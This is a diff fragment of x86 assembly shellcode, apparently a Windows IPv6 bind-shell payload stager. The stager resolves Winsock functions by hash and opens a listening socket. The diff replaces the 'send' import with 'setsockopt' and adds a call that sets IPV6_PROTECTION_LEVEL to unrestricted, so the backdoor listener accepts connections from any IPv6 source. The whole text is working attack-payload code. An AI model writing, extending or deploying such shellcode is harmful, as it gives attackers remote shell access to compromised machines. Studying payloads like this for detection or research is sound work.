@@ -111,7 +111,7 @@ mov ebp, esp
 call LLoadWinsock
 
 %define FN_RECV     [ebp + 24]
-%define FN_SEND     [ebp + 28]
+%define FN_SETSOCKOPT [ebp + 28]
 %define FN_ACCEPT   [ebp + 32]
 %define FN_BIND     [ebp + 36]
 %define FN_LISTEN   [ebp + 40]
@@ -122,7 +122,7 @@ LWSDataSegment:
 ;========================
 dd 0x190      ; used by wsastartup
 dd 0xe71819b6 ; recv        [ebp + 24]
-dd 0xe97019a4 ; send        [ebp + 28]
+dd 0xc055f2ec ; setsockopt  [ebp + 28]
 dd 0x498649e5 ; accept      [ebp + 32]
 dd 0xc7701aa4 ; bind        [ebp + 36]
 dd 0xe92eada4 ; listen      [ebp + 40]
@@ -139,7 +139,7 @@ LLoadWinsock:
     mov edi, ebx        ; store base of data section in edi
     mov ebx, eax        ; store base of winsock in ebx
     lea esi, [ebp + 20] ; store base of function table
-    push byte 0x07      ; load five functions by hash
+    push byte 7         ; load 7 functions by hash
     pop ecx             ; configure the counter
 
 Looper:    
@@ -180,7 +180,17 @@ LWSASocketA:                    ; WSASocketA (23,1,6,0,0,0)
 	; WSASocket()
 	call FN_WSASOCK
 	mov edi, eax
-
+	
+	push byte 10           ; dwProtectionLevel = PROTECTION_LEVEL_UNRESTRICTED
+	mov eax, esp           ; save an address for this
+	push byte 4            ; sizeof(DWORD)
+	push eax               ; pointer to PROTECTION_LEVEL_UNRESTRICTED
+	push byte 23           ; IPV6_PROTECTION_LEVEL
+	push byte 41           ; IPPROTO_IPV6 
+	push edi               ; the socket
+	call FN_SETSOCKOPT     ; setsockopt( sock, IPPROTO_IPV6, IPV6_PROTECTION_LEVEL, &dwProtectionLevel, sizeof(DWORD) );
+	pop eax
+    
 LBind:
 
 	; sin6_scope_id
